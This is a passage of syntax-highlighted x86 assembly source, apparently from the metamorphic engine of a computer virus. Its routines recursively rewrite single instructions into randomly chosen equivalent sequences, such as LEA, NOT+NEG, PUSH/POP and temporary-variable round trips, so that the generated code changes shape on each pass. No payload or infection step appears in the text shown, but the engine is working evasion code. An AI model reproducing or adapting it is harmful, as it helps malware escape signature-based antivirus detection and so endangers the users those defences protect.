                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_CMP_OR</span><span class="sc0">    </span><span class="sc1">; Prob. of 25% of making OR Reg,Reg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_CMP_AND</span><span class="sc0">   </span><span class="sc1">; Prob. of 25% of making AND Reg,Reg</span><span class="sc0">
   </span><span class="sc5">@@Single_CMP_TEST</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Prob. of 25% of making TEST Reg,Reg</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc0">   </span><span class="sc1">; 3, +27 = 2A, +17 = 41, +8 = 49h: TEST</span><span class="sc0">
   </span><span class="sc5">@@Single_CMP_AND</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">   </span><span class="sc1">; 2, +17 = 19, +8 = 21h: AND</span><span class="sc0">
   </span><span class="sc5">@@Single_CMP_OR</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">; 1, +8 = 9h: OR</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Set the size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the register and set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; as source and destiny</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                </span><span class="sc1">; Increase storage pointer</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single_XOR</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; If we make XOR Reg,-1 we</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; can also make NOT Reg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_OP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single_ADD</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; Check the Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; ADD Reg,1?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_ADD_NOTNEG</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; ADD Reg,-1?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_ADD_NEGNOT</span><span class="sc0">
   </span><span class="sc5">@@Single_OP_ADD</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">           </span><span class="sc1">; Select randomly TRUE/FALSE</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP</span><span class="sc0">               </span><span class="sc1">; Make normal ADD if FALSE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; If size = 8 bits, don't make</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_OP</span><span class="sc0">               </span><span class="sc1">; LEA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">               </span><span class="sc1">; Make LEA Reg,[Reg+Imm]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single_ADD_NOTNEG</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">           </span><span class="sc1">; Select randomly if we do</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; NOT Reg+NEG Reg or INC Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_ADD_INC</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP_ADD</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTReg</span><span class="sc0">            </span><span class="sc1">; Generate NOT Reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGReg</span><span class="sc0">            </span><span class="sc1">; Generate NEG Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single_ADD_INC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">@@Single_ADD_INCDEC_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Set INC/DEC Reg. EBX is 0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">                </span><span class="sc1">; if we decided to do INC, or</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; 8 if we decided DEC</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; This opcode (4E) is only</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                </span><span class="sc1">; used here to tell the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0"> </span><span class="sc1">; assembler that makes INC/DEC</span><span class="sc0">
   </span><span class="sc5">@@Single_ADD_NEGNOT</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_ADD_DEC</span><span class="sc0">          </span><span class="sc1">; Select NEG+NOT or DEC</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Select randomly to do NOT+NEG</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_OP_ADD</span><span class="sc0">         </span><span class="sc1">; or a normal ADD operation (or</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGReg</span><span class="sc0">          </span><span class="sc1">; maybe LEA)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single_ADD_DEC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; Set DEC operation</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_ADD_INCDEC_Common</span><span class="sc0"> </span><span class="sc1">; Jump to complete the instr.</span><span class="sc0">
</span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This function generates an OP Reg,Reg from the values in the corresponding</span><span class="sc0">
</span><span class="sc1">;; fields. Like the previous function, we also look for special cases for</span><span class="sc0">
</span><span class="sc1">;; some operations (MOV, etc.) to code them with valid alternatives (for</span><span class="sc0">
</span><span class="sc1">;; example, PUSH Reg+POP Reg2 for MOV, or LEA Reg,[Reg2], etc.).</span><span class="sc0">
</span><span class="sc5">Xp_GenOPRegReg</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; Too much deep in recursivity?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">          </span><span class="sc1">; If so, code a not-recursive instrc.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Select randomly the usage of a</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">          </span><span class="sc1">; single instruction</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Pair or triplet?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double</span><span class="sc0">          </span><span class="sc1">; Jump to make a pair</span><span class="sc0">
   </span><span class="sc5">@@Triple</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">        </span><span class="sc1">; If CMP, MOV or TEST make a pair</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Double</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">    </span><span class="sc1">; Allocate a temporary variable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; Set MOV operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">          </span><span class="sc1">; Generate a MOV [Mem],Reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Restore the operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Set the source destiny into</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; the "Register" field</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">          </span><span class="sc1">; Generate a OP [Mem],srcReg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Restore the destiny reg.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set MOV operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">          </span><span class="sc1">; Generate a MOV Reg,[Mem]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Double</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_MOV</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">                </span><span class="sc1">; CMP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_CMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                </span><span class="sc1">; TEST?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_TEST</span><span class="sc0">
   </span><span class="sc5">@@Double_OP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">           </span><span class="sc1">; Allocate a temp. variable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; Set MOV</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">          </span><span class="sc1">; Make a MOV [TempVar],srcReg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Restore the destiny register</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Restore the operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegMem</span><span class="sc0">          </span><span class="sc1">; Make an OP dstReg,[TempVar]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Double_MOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Decide randomly if we use</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_OP</span><span class="sc0">               </span><span class="sc1">; the common making</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; If the size is 8 bits, make</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_OP</span><span class="sc0">               </span><span class="sc1">; a common OP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Save the register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the source register as</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; the destiny</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHReg</span><span class="sc0">             </span><span class="sc1">; Generate a PUSH srcReg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Restore the desstiny reg.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPReg</span><span class="sc0">              </span><span class="sc1">; Generate a POP dstReg</span><span class="sc0">
